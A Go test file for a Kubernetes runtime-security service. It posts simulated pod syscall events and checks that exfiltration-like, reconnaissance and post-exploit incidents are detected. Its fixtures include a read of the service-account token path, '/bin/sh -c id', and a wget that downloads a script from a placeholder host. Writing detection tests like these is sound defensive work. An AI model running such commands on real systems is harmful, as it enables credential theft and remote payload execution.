package api

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/glebarez/sqlite"
	"gorm.io/gorm"

	"github.com/fortuna/core/pkg/models"
)

// TestRuntimeFlow_AgentToCoreToDBToV2API verifies end-to-end flow:
// agent-shape payload -> core REP processing -> DB facts/incidents -> v2 read API.
func TestRuntimeFlow_AgentToCoreToDBToV2API(t *testing.T) {
	gin.SetMode(gin.TestMode)
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatalf("db: %v", err)
	}
	if err := db.AutoMigrate(
		&models.RuntimeEvent{},
		&models.RuntimeSignal{},
		&models.RuntimeBehaviorFact{},
		&models.RuntimeIncident{},
		&models.PodRiskProfile{},
	); err != nil {
		t.Fatalf("migrate: %v", err)
	}

	r := gin.New()
	r.POST("/api/v1/runtime/events", PostRuntimeEvents(db))
	r.GET("/api/v2/runtime/pods/:uid/facts", GetPodRuntimeBehaviorFacts(db))
	r.GET("/api/v2/runtime/pods/:uid/incidents", GetPodRuntimeIncidents(db))

	podUID := "eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee"
	payload := []map[string]interface{}{
		{
			"pod": map[string]interface{}{
				"uid":       podUID,
				"namespace": "ns",
				"name":      "demo",
			},
			"syscall":    "openat",
			"target":     "/var/run/secrets/kubernetes.io/serviceaccount/token",
			"confidence": 0.9,
		},
		{
			"pod": map[string]interface{}{
				"uid":       podUID,
				"namespace": "ns",
				"name":      "demo",
			},
			"syscall":    "connect",
			"target":     "dst=8.8.8.8:53 proto=udp dport=53",
			"confidence": 0.9,
		},
	}
	body, _ := json.Marshal(payload)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/runtime/events", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("post status %d: %s", w.Code, w.Body.String())
	}

	// DB verify: incidents should contain EXFIL_LIKE_SEQUENCE from REP-C.
	var incidentsDB []models.RuntimeIncident
	if err := db.Where("pod_uid = ?", podUID).Find(&incidentsDB).Error; err != nil {
		t.Fatalf("query incidents: %v", err)
	}
	if len(incidentsDB) == 0 {
		t.Fatalf("expected at least 1 incident in db, got 0")
	}

	// API verify: facts endpoint
	wFacts := httptest.NewRecorder()
	reqFacts := httptest.NewRequest(http.MethodGet, "/api/v2/runtime/pods/"+podUID+"/facts?limit=50", nil)
	r.ServeHTTP(wFacts, reqFacts)
	if wFacts.Code != http.StatusOK {
		t.Fatalf("facts status %d: %s", wFacts.Code, wFacts.Body.String())
	}
	var factsResp map[string]interface{}
	if err := json.Unmarshal(wFacts.Body.Bytes(), &factsResp); err != nil {
		t.Fatalf("facts unmarshal: %v", err)
	}
	if int(factsResp["total"].(float64)) == 0 {
		t.Fatalf("facts total expected >0, got 0")
	}

	// API verify: incidents endpoint
	wInc := httptest.NewRecorder()
	reqInc := httptest.NewRequest(http.MethodGet, "/api/v2/runtime/pods/"+podUID+"/incidents?limit=50", nil)
	r.ServeHTTP(wInc, reqInc)
	if wInc.Code != http.StatusOK {
		t.Fatalf("incidents status %d: %s", wInc.Code, wInc.Body.String())
	}
	var incResp map[string]interface{}
	if err := json.Unmarshal(wInc.Body.Bytes(), &incResp); err != nil {
		t.Fatalf("incidents unmarshal: %v", err)
	}
	if int(incResp["total"].(float64)) == 0 {
		t.Fatalf("incidents total expected >0, got 0")
	}
}

func TestGetPodAssetSecurityState_NotFoundWhenTableMissing(t *testing.T) {
	gin.SetMode(gin.TestMode)
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatalf("db: %v", err)
	}
	// Intentionally do NOT migrate AssetSecurityState table.
	if err := db.AutoMigrate(&models.RuntimeEvent{}); err != nil {
		t.Fatalf("migrate: %v", err)
	}

	r := gin.New()
	r.GET("/api/v2/runtime/pods/:uid/security-state", GetPodAssetSecurityState(db))

	w := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/api/v2/runtime/pods/pod-x/security-state", nil)
	r.ServeHTTP(w, req)
	if w.Code != http.StatusNotFound {
		t.Fatalf("expected 404, got %d body=%s", w.Code, w.Body.String())
	}
}

func TestGetPodAssetSecurityState_OK(t *testing.T) {
	gin.SetMode(gin.TestMode)
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatalf("db: %v", err)
	}
	if err := db.AutoMigrate(&models.AssetSecurityState{}); err != nil {
		t.Fatalf("migrate: %v", err)
	}
	podUID := "state-pod-1"
	now := time.Now().UTC()
	row := models.AssetSecurityState{
		AssetType:              "pod",
		PodUID:                 podUID,
		Namespace:              "ns",
		ClusterID:              "c1",
		SignalTotal24h:         3,
		HasSuspiciousExec:      true,
		HasNetworkQueueAnomaly: true,
		HasEscapeRelated:       false,
		RuntimeSignalsByType:   `{"NETWORK_QUEUE_ANOMALY":2}`,
		EffectiveCapabilities:  `["ESC_RUNTIME_PROBE"]`,
		CreatedAt:              now,
		UpdatedAt:              now,
	}
	if err := db.Create(&row).Error; err != nil {
		t.Fatalf("seed state: %v", err)
	}

	r := gin.New()
	r.GET("/api/v2/runtime/pods/:uid/security-state", GetPodAssetSecurityState(db))

	w := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/api/v2/runtime/pods/"+podUID+"/security-state", nil)
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", w.Code, w.Body.String())
	}
	var out map[string]interface{}
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if out["podUid"] != podUID {
		t.Fatalf("podUid mismatch: %+v", out)
	}
}

func TestRuntimeFlow_StatefulIncidents_ReconAndPostExploit(t *testing.T) {
	gin.SetMode(gin.TestMode)
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatalf("db: %v", err)
	}
	if err := db.AutoMigrate(
		&models.RuntimeEvent{},
		&models.RuntimeSignal{},
		&models.RuntimeBehaviorFact{},
		&models.RuntimeIncident{},
		&models.PodRiskProfile{},
	); err != nil {
		t.Fatalf("migrate: %v", err)
	}

	r := gin.New()
	r.POST("/api/v1/runtime/events", PostRuntimeEvents(db))
	r.GET("/api/v2/runtime/pods/:uid/incidents", GetPodRuntimeIncidents(db))

	podUID := "iiiiiiii-iiii-iiii-iiii-iiiiiiiiiiii"
	basePod := map[string]interface{}{
		"uid":       podUID,
		"namespace": "ns",
		"name":      "demo",
	}

	// Emit enough network connects to trigger RECON_BURST.
	var payload []map[string]interface{}
	for i := 0; i < 6; i++ {
		payload = append(payload, map[string]interface{}{
			"pod":        basePod,
			"syscall":    "connect",
			"target":     "dst=8.8.8.8:53 proto=udp dport=53",
			"confidence": 0.9,
		})
	}
	// Emit execution chain to trigger POST_EXPLOIT_EXEC_CHAIN:
	// - /bin/sh => INTERACTIVE_SHELL
	// - /tmp/wget => TMP_BINARY_EXEC + REMOTE_TOOL_EXEC
	payload = append(payload,
		map[string]interface{}{"pod": basePod, "syscall": "execve", "target": "/bin/sh -c id", "confidence": 0.9},
		map[string]interface{}{"pod": basePod, "syscall": "execve", "target": "/tmp/wget http://x/p.sh -O /tmp/p.sh", "confidence": 0.9},
	)

	body, _ := json.Marshal(payload)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/runtime/events", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("post status %d: %s", w.Code, w.Body.String())
	}

	wInc := httptest.NewRecorder()
	reqInc := httptest.NewRequest(http.MethodGet, "/api/v2/runtime/pods/"+podUID+"/incidents?limit=50", nil)
	r.ServeHTTP(wInc, reqInc)
	if wInc.Code != http.StatusOK {
		t.Fatalf("incidents status %d: %s", wInc.Code, wInc.Body.String())
	}
	var incResp map[string]interface{}
	if err := json.Unmarshal(wInc.Body.Bytes(), &incResp); err != nil {
		t.Fatalf("incidents unmarshal: %v", err)
	}

	items, _ := incResp["incidents"].([]interface{})
	foundRecon := false
	foundPostExploit := false
	for _, it := range items {
		row, _ := it.(map[string]interface{})
		typ, _ := row["incidentType"].(string)
		if typ == "RECON_BURST" {
			foundRecon = true
		}
		if typ == "POST_EXPLOIT_EXEC_CHAIN" {
			foundPostExploit = true
		}
	}
	if !foundRecon || !foundPostExploit {
		t.Fatalf("expected RECON_BURST and POST_EXPLOIT_EXEC_CHAIN incidents, got body=%s", wInc.Body.String())
	}
}
